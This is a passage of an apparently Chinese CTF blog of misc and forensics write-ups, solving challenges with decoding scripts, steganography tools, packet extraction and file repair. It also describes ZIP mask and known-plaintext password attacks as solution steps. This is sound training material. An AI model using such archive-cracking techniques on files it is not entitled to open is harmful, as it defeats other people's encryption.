class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64decode</span>():</span></span><br><span class="line">    f = open(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    flag = f.read()</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">        flag = base64.b64decode(flag)</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&quot;Start...&quot;</span>)</span><br><span class="line">    base64decode()</span><br><span class="line">    print(<span class="string">&#x27;Done!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>有大量的ICMP数据包，并且icmp数据包有data字段，直接wireshark提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r out.pcap -T fields -e &quot;data&quot; &gt;flag.txt</span><br></pre></td></tr></table></figure><p>发现txt中有大量重复的数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2424535441525424242d2d2d2d2d424547494e2043455254494649434154452d2d2d2d2d0a</span><br></pre></td></tr></table></figure><p>每4行都是重复的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort 1.txt | uniq &gt;&gt;2.txt</span><br></pre></td></tr></table></figure><p>python批量转十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lines&#x3D;open(&#39;out.txt&#39;,&#39;rb&#39;).readlines()</span><br><span class="line">file&#x3D;open(&#39;old_file.txt&#39;,&#39;wb&#39;)</span><br><span class="line">i&#x3D;0</span><br><span class="line">for line in lines:</span><br><span class="line">        if i%4&#x3D;&#x3D;0:</span><br><span class="line">                file.write(line.strip().decode(&#39;hex&#39;))</span><br><span class="line">        i+&#x3D;1</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>像是十六进制，但是每行头上有<code>$$START$$+</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">lines=open(<span class="string">&#x27;old_file.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).readlines()</span><br><span class="line">file=open(<span class="string">&#x27;new_file&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">    result+=line[<span class="number">9</span>:].strip()</span><br><span class="line">file.write(base64.b64decode(result))</span><br></pre></td></tr></table></figure><p>得到一个zip。一个gif。查看每一帧的间隔时间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">identify -verbose flag.gif | grep Delay</span><br><span class="line">  Delay: 50x100</span><br><span class="line">  Delay: 50x100</span><br><span class="line">  Delay: 50x100</span><br><span class="line">  Delay: 20x100</span><br><span class="line">  Delay: 50x100</span><br><span class="line">  Delay: 20x100</span><br><span class="line">  Delay: 20x100</span><br><span class="line">  Delay: 66x100</span><br><span class="line">  Delay: 66x100</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format &quot;%s %T \n&quot; flag.gif </span><br></pre></td></tr></table></figure><p>把20改成0,50改成1 转下ascii。</p><h3 id="GUET-CTF2019-虚假的压缩包"><a href="#GUET-CTF2019-虚假的压缩包" class="headerlink" title="[GUET-CTF2019]虚假的压缩包"></a>[GUET-CTF2019]虚假的压缩包</h3><p>两个压缩包，一个未加密，一个真密码。伪加密解压出来是rsa题，解密得到密码–答案是5。解压真压缩包，拿到一张图片和一个文件，图片修改高度。提示^5。即把文件与5异或。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f1 = open(<span class="string">&#x27;./cipher&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">xor_data = f1.read()</span><br><span class="line">f1.close()</span><br><span class="line">dec_data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xor_data:</span><br><span class="line">    tmp = int(i,<span class="number">16</span>) ^ <span class="number">5</span></span><br><span class="line">    dec_data += hex(tmp)[<span class="number">2</span>:]</span><br><span class="line">print(dec_data[:<span class="number">10</span>])</span><br></pre></td></tr></table></figure><p><code>504b030414</code>是个压缩包，保存为压缩包。打开之后发现是个word。改为doc。</p><p>拿到许多英文句子，直接搜索flag。发现flag被隐藏。直接改颜色。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/48.png" alt="48"></p><h3 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy misc"></a>easy misc</h3><p>掩码攻击拿到压缩包内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">a = dIW</span><br><span class="line">b = sSD</span><br><span class="line">c = adE </span><br><span class="line">d = jVf</span><br><span class="line">e = QW8</span><br><span class="line">f = SA=</span><br><span class="line">g = jBt</span><br><span class="line">h = <span class="number">5</span>RE</span><br><span class="line">i = tRQ</span><br><span class="line">j = SPA</span><br><span class="line">k = <span class="number">8</span>DS</span><br><span class="line">l = XiE</span><br><span class="line">m = S8S</span><br><span class="line">n = MkF</span><br><span class="line">o = T9p</span><br><span class="line">p = PS5</span><br><span class="line">q = E/S</span><br><span class="line">r = -sd</span><br><span class="line">s = SQW</span><br><span class="line">t = obW</span><br><span class="line">u = /WS</span><br><span class="line">v = SD9</span><br><span class="line">w = cw=</span><br><span class="line">x = ASD</span><br><span class="line">y = FTa</span><br><span class="line">z = AE7</span><br></pre></td></tr></table></figure><p>词频分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">&#x27;./1.txt&#x27;</span>)</span><br><span class="line">line = file.readlines()</span><br><span class="line">file.seek(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> line:</span><br><span class="line">find_line = re.findall(chr(i),j)</span><br><span class="line">count += len(find_line)</span><br><span class="line">result[chr(i)] = count</span><br><span class="line">res = sorted(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> res:</span><br><span class="line">print(<span class="string">&#x27;频数第&#123;0&#125;: &#x27;</span>.format(num),x)</span><br><span class="line">num += <span class="number">1</span> </span><br></pre></td></tr></table></figure><h3 id="派大星的烦恼"><a href="#派大星的烦恼" class="headerlink" title="派大星的烦恼"></a>派大星的烦恼</h3><p>放入01edito，找到<code>&quot;DD&quot;``DD``&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;``&quot;&quot;&quot;DD&quot;&quot;&quot;``DD&quot;DD&quot;``&quot;D&quot;``&quot;DDD&quot;``&quot;D&quot;``D``&quot;DD&quot;``&quot;&quot;&quot;&quot;``&quot;DD&quot;``&quot;D&quot;``&quot;&quot;``&quot;DD&quot;``D``&quot;D&quot;``DD&quot;&quot;&quot;``&quot;D&quot;``DD&quot;``&quot;D&quot;``&quot;``&quot;DD&quot;``&quot;&quot;&quot;``&quot;DDD&quot;``&quot;&quot;``&quot;D&quot;``DD&quot;&quot;``&quot;D&quot;``&quot;``&quot;DD&quot;``&quot;``&quot;D&quot;``&quot;DD&quot;``D``&quot;D&quot;``DD``&quot;&quot;&quot;DD&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;&quot;``D``&quot;&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;D&quot;D&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;``D``&quot;&quot;&quot;DD&quot;&quot;&quot;``D&quot;DD&quot;``&quot;DD&quot;``&quot;``&quot;DD&quot;``D``&quot;D&quot;``&quot;DD&quot;``&quot;``&quot;D&quot;``DD&quot;``&quot;DD&quot;``&quot;DD&quot;``&quot;&quot;&quot;``&quot;DDD&quot;``&quot;DD&quot;``&quot;DD&quot;``&quot;``&quot;D&quot;``&quot;DD&quot;``&quot;</code>。</p><p>D变1，”变成0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_to_str</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">&#x27; &#x27;</span>)]])</span><br><span class="line">a = <span class="string">&quot;01101100 00101100 00001100 01101100 10011100 10101100 00001100 10000110 10101100 00101100 10001100 00011100 00101100 01000110 00100110 10101100 01100110 10100110 01101100 01000110 01101100 10100110 10101100 01000110 00101100 11000110 10100110 00101100 11001100 00011100 11001100 01001100&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    test=i[::<span class="number">-1</span>]</span><br><span class="line">    flag+=bin_to_str(test)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h3 id="GKCTF2020-Harley-Quinn"><a href="#GKCTF2020-Harley-Quinn" class="headerlink" title="[GKCTF2020]Harley Quinn"></a>[GKCTF2020]Harley Quinn</h3><p>使用<code>dtmf2num</code>，解密没成功。使用<code>multimon-ng</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ multimon-ng -t wav -a dtmf /home/steady/桌面/steady/Heathens.wav</span><br><span class="line">multimon-ng <span class="number">1.1</span><span class="number">.9</span></span><br><span class="line">  (C) <span class="number">1996</span>/<span class="number">1997</span> by Tom Sailer HB9JNX/AE4WA</span><br><span class="line">  (C) <span class="number">2012</span><span class="number">-2020</span> by Elias Oenal</span><br><span class="line">Available demodulators: POCSAG512 POCSAG1200 POCSAG2400 FLEX EAS UFSK1200 CLIPFSK FMSFSK AFSK1200 AFSK2400 AFSK2400_2 AFSK2400_3 HAPN4800 FSK9600 DTMF ZVEI1 ZVEI2 ZVEI3 DZVEI PZVEI EEA EIA CCIR MORSE_CW DUMPCSV X10 SCOPE</span><br><span class="line">Enabled demodulators: DTMF</span><br><span class="line">DTMF: <span class="comment">#</span></span><br><span class="line">DTMF: <span class="number">2</span></span><br><span class="line">DTMF: <span class="number">2</span></span><br><span class="line">DTMF: <span class="number">2</span></span><br><span class="line">DTMF: <span class="number">8</span></span><br><span class="line">DTMF: <span class="number">3</span></span><br><span class="line">DTMF: <span class="number">4</span></span><br><span class="line">DTMF: <span class="number">4</span></span><br><span class="line">DTMF: <span class="number">4</span></span><br><span class="line">DTMF: <span class="number">7</span></span><br><span class="line">DTMF: <span class="number">7</span></span><br><span class="line">DTMF: <span class="number">7</span></span><br><span class="line">DTMF: <span class="number">7</span></span><br><span class="line">DTMF: <span class="number">3</span></span><br><span class="line">DTMF: <span class="number">8</span></span><br><span class="line">DTMF: <span class="number">8</span></span><br><span class="line">DTMF: <span class="number">6</span></span><br><span class="line">DTMF: <span class="number">6</span></span><br><span class="line">DTMF: <span class="comment">#</span></span><br><span class="line">sox WARN rate: rate clipped 2152 samples; decrease volume?</span><br><span class="line">sox WARN dither: dither clipped 1920 samples; decrease volume?</span><br></pre></td></tr></table></figure><p>手机密码。</p><h3 id="粽子的来历"><a href="#粽子的来历" class="headerlink" title="粽子的来历"></a>粽子的来历</h3><p>doc打不开，尝试修改某处为FF。打开在后行间距转化0或者1。</p><h3 id="BSidesSF2019-zippy"><a href="#BSidesSF2019-zippy" class="headerlink" title="[BSidesSF2019]zippy"></a>[BSidesSF2019]zippy</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;media$ tcpxtract -f attachment.pcapng</span><br><span class="line">Found file of type &quot;zip&quot; in session [192.168.56.2:4244 -&gt; 192.168.56.104:23825], exporting to 00000000.zip</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-spaceclub"><a href="#WUSTCTF2020-spaceclub" class="headerlink" title="[WUSTCTF2020]spaceclub"></a>[WUSTCTF2020]spaceclub</h3><p>text文件空白，全选，每一行的长短对应一个二进制数字。长为1，断为0。最后转二进制。</p><h3 id="CTF2019-otaku"><a href="#CTF2019-otaku" class="headerlink" title="[*CTF2019]otaku"></a>[*CTF2019]otaku</h3><p>一个压缩包、一个word，打开word，打开隐藏文字。发现多了一下的文字。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can&#39;t contact Violet now. She must be desperate to see me and I don&#39;t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted.&#x2F;&#x2F;最后可以看到明文攻击。</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/51.png" alt="51"></p><p>可以看到这时候CRC一样。可以进行明文攻击。拿到图片，lsb隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf&#123;vI0l3t_Ev3rg@RdeN&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-music"><a href="#ACTF新生赛2020-music" class="headerlink" title="[ACTF新生赛2020]music"></a>[ACTF新生赛2020]music</h3><p>放入winhex中，发现大量的A1。将文件与A1进行异或。发现文件头<code>0000001866747970</code>，mp4文件格式。修改后缀，听音乐拿到flag。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/52.png" alt="52"></p><h3 id="voip"><a href="#voip" class="headerlink" title="voip"></a>voip</h3><p>数据包，voip：互联网协议语音（VoIP），也称为IP电话，简称电话。</p><p>点击播放流并播放即有声音读出flag：seccon{9001IVR}</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/53.png" alt="53"></p><p>读取电话音频。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/54.png" alt="54"></p><h3 id="湖南省赛2019-Findme"><a href="#湖南省赛2019-Findme" class="headerlink" title="[湖南省赛2019]Findme"></a>[湖南省赛2019]Findme</h3><p>七张图，一张一张分析。</p><p>第一张，图片高度明显小，直接CRC爆破，拿到图片，发现高度可以了但是图片模糊了。</p><p>然后使用<code>Stegsolve</code>打开，在<code>blue 2</code>通道发现二维码。扫描拿到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s0X3</span><br></pre></td></tr></table></figure><p>第二张图，binwalk分离，没有分离出来东西。<code>strings</code>查看，发现有txt字样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CRys</span><br><span class="line">CRys</span><br><span class="line">2&#x2F;998.txt</span><br><span class="line">jRys</span><br><span class="line">jRys</span><br><span class="line">jRys</span><br><span class="line">2&#x2F;999.txt</span><br></pre></td></tr></table></figure><p>可以判定藏有压缩包。尝试搜搜常见的压缩包头部，比如zip、7z等等，但是都没有发现什么线索。直接搜索png尾部，<code>49 45 4E 44 AE 42 60 82</code>。发现后面的数据为<code>37 7A 03 04</code>。有点像zip的头部，直接修改504B。打开之后发现文件打不开，提示文件损坏。返回看看，发现zip中有7z字样，最后直接把所有的7z替换为PK。导出十六进制，然后放入notepad，把37 7A替换为50 4B。保存，还是不能打开最后直接使用winrar进行修复。解压拿到许多文件。解压对文件大小进行排序，发现618.txt在第一个直接打开发现<code>You find it: 1RVcmVfc</code>。</p><p>第三个图片。</p><p>chunk[0]-chunk[6]的每一个数据块的crc值都是可打印的Ascii字符。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/57.png" alt="57"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; [0x33,0x52,0x6C,0x5A,0x33,0x30,0x3D]</span><br><span class="line">for i in a:</span><br><span class="line">    print(chr(i),end&#x3D;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">#运行结果：3RlZ30&#x3D;</span><br></pre></td></tr></table></figure><p>第四个图片。</p><p><code>exiftool</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ exiftool &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;4.png</span><br><span class="line">ExifTool Version Number         : 12.07</span><br><span class="line">File Name                       : 4.png</span><br><span class="line">Directory                       : &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady</span><br><span class="line">File Size                       : 63 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2019:10:19 18:50:30+08:00</span><br><span class="line">File Access Date&#x2F;Time           : 2020:11:05 21:06:05+08:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2020:11:05 21:06:05+08:00</span><br><span class="line">File Permissions                : rw-------</span><br><span class="line">File Type                       : PNG</span><br><span class="line">File Type Extension             : png</span><br><span class="line">MIME Type                       : image&#x2F;png</span><br><span class="line">Image Width                     : 145</span><br><span class="line">Image Height                    : 263</span><br><span class="line">Bit Depth                       : 8</span><br><span class="line">Color Type                      : RGB</span><br><span class="line">Compression                     : Deflate&#x2F;Inflate</span><br><span class="line">Filter                          : Adaptive</span><br><span class="line">Interlace                       : Noninterlaced</span><br><span class="line">Pixels Per Unit X               : 2835</span><br><span class="line">Pixels Per Unit Y               : 2835</span><br><span class="line">Pixel Units                     : meters</span><br><span class="line">Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)</span><br><span class="line">Artist                          : another part:cExlX1BsY</span><br><span class="line">Image Size                      : 145x263</span><br><span class="line">Megapixels                      : 0.038</span><br></pre></td></tr></table></figure><p>第五张图片。</p><p><code>strings</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.png &#x3D;&gt; Yzcllfc0lN</span><br></pre></td></tr></table></figure><h3 id="Business-Planning-Group"><a href="#Business-Planning-Group" class="headerlink" title="Business Planning Group"></a>Business Planning Group</h3><p>bpg图片，直接搜索PNG尾部<code>42 60 82</code>，接下来是bpg的头部，截取下来。使用<code>Honeyview</code>，打开。</p><p>打开之后拿到base64解码，拿到flag。</p><h3 id="我爱Linux"><a href="#我爱Linux" class="headerlink" title="我爱Linux"></a>我爱Linux</h3><p>python序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle  </span><br><span class="line"></span><br><span class="line">fp &#x3D; open(&quot;2.txt&quot;,&quot;rb+&quot;)      &#39;&#39;&#39; 打开序列化文件 &#39;&#39;&#39;</span><br><span class="line">fw &#x3D; open(&#39;pickle.txt&#39;, &#39;w&#39;)  &#39;&#39;&#39; 打开保存文件 &#39;&#39;&#39;</span><br><span class="line">a&#x3D;pickle.load(fp)             &#39;&#39;&#39; 反序列化文件编译 &#39;&#39;&#39;</span><br><span class="line">pickle&#x3D;str(a)                 &#39;&#39;&#39; 转换成字符串要不然不能保存 &#39;&#39;&#39;</span><br><span class="line">fw.write( pickle )            &#39;&#39;&#39; 写入文件 &#39;&#39;&#39;</span><br><span class="line">fw.close()                    &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39;</span><br><span class="line">fp.close()                    &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39;</span><br></pre></td></tr></table></figure><p>第一个是坐标，第二个是内容。画图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">fw = open(<span class="string">&quot;pickle.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">text=fw.read( )</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;len(text)+<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(text[i]==<span class="string">&#x27;]&#x27;</span>):</span><br><span class="line">       print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">       a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span>(text[i]==<span class="string">&#x27;(&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(text[i+<span class="number">2</span>]==<span class="string">&#x27;,&#x27;</span>):</span><br><span class="line">            b=text[i+<span class="number">1</span>]</span><br><span class="line">            d=text[i+<span class="number">1</span>]</span><br><span class="line">            b=int(b)-int(a)</span><br><span class="line">            c=<span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> c&lt;b:</span><br><span class="line">                print(<span class="string">&quot; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                c += <span class="number">1</span></span><br><span class="line">            print(text[i+<span class="number">5</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            a=int(d)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b=text[i+<span class="number">1</span>]+text[i+<span class="number">2</span>]</span><br><span class="line">            d=text[i+<span class="number">1</span>]+text[i+<span class="number">2</span>]</span><br><span class="line">            b=int(b)-int(a)</span><br><span class="line">            c=<span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> c&lt;b:</span><br><span class="line">                print(<span class="string">&quot; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                c += <span class="number">1</span></span><br><span class="line">            print(text[i+<span class="number">6</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            a=int(d)</span><br><span class="line">    i +=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h3><p>一个音频，打开之后没有发现什么东西。尝试binwalk。分离不出东西。尝试隐写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ steghide extract -sf out.wav</span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to <span class="string">&quot;download.txt&quot;</span>.</span><br></pre></td></tr></table></figure><p>拿到一个下载链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;share.weiyun.com&#x2F;5wVTIN3</span><br></pre></td></tr></table></figure><p>一个PNG文件，修复头部，图片是unicode，编码使用小红帽编码。</p><h3 id="BSidesSF2019-diskimage"><a href="#BSidesSF2019-diskimage" class="headerlink" title="[BSidesSF2019]diskimage"></a>[BSidesSF2019]diskimage</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:&#x2F;tmp# zsteg &#39;&#x2F;tmp&#x2F;attachment (1).png&#39; --all</span><br><span class="line">b8,rgb,lsb,xy       .. file: DOS&#x2F;MBR boot sector, code offset 0x3c+2, OEM-ID &quot;~mitsumi&quot;, root entries 224, sectors 2880 (volumes &lt;&#x3D;32 MB) , sectors&#x2F;FAT 9, sectors&#x2F;track 18, serial number 0x7e572f0f, unlabeled, FAT (12 bit)</span><br></pre></td></tr></table></figure><p>导出一个fat数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:&#x2F;tmp# zsteg -a &#39;b8,rgb,lsb,xy&#39; &#39;&#x2F;tmp&#x2F;attachment (1).png&#39;  &gt;flag.dat</span><br></pre></td></tr></table></figure><h3 id="V-amp-N2020-公开赛-拉胯的三条命令"><a href="#V-amp-N2020-公开赛-拉胯的三条命令" class="headerlink" title="[V&amp;N2020 